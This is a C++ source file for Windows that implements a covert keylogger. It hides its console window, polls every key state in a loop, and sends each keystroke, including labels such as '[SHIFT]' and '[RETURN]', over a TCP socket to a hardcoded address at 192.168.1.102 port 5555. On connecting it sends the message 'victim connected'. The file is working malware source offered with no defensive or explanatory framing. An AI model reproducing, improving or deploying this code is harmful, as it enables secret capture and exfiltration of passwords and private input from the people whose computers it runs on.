#include "iostream"
#include <WinSock2.h>
#include <Windows.h>
#include <thread>
#include <string.h>
#define _WINSOCKAPI_
#pragma warning(disable:4996)
#pragma comment(lib, "Ws2_32.lib")
 
using namespace std;

int Save(SOCKET server,int _key);
void clientSendMess(SOCKET a, char line[10]);
SOCKET CreateClient();

int main()
{
	FreeConsole();
	SOCKET server = CreateClient();
	char i;
	while (true)
	{
		Sleep(10);
		for (i = 8; i <= 233; i++)
			if (GetAsyncKeyState(i) == -32767)
			{
				Save(server, i);
			}
	}
	return 0;

}

void clientSendMess(SOCKET a, char line[10]) {
	char buffer[10];
	strcpy(buffer, line);
	send(a, buffer, sizeof(buffer), 0);
	memset(buffer, 0, sizeof(buffer));
}
int Save(SOCKET server, int _key)
{
	cout << _key << endl;
	char buffer[10];
	Sleep(10);
	if (_key == VK_SHIFT) {
		strcpy(buffer, "[SHIFT]");
		clientSendMess(server,buffer);
	}
	else if (_key == VK_BACK) {
		strcpy(buffer, "[BACK]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_LBUTTON) {
		strcpy(buffer, "[LBUTTON]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_RBUTTON) {
		strcpy(buffer, "[RBUTTON]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_ESCAPE) {
		strcpy(buffer, "[ESCAPE]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_RETURN) {
		strcpy(buffer, "[RETURN]\n");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_TAB) {
		strcpy(buffer, "[TAB]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_CONTROL) {
		strcpy(buffer, "[CONTROL]");
		clientSendMess(server, buffer);
	}
	else if (_key == VK_MENU) {
		strcpy(buffer, "[ALT]");
		clientSendMess(server, buffer);
	}
	else {
		char c[10] = { _key };
		strcpy(buffer, c);
		clientSendMess(server,buffer );
	}
	return 0;
}

SOCKET CreateClient() {
	WSADATA WSAData;
	SOCKET server;
	WSAStartup(MAKEWORD(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN serverAddr;
	serverAddr.sin_addr.s_addr = inet_addr("192.168.1.102");
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(5555);
	connect(server, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
	char buffer[30];
	strcpy(buffer, "victim connected");
	send(server, buffer, sizeof(buffer), 0);
	return server;
}



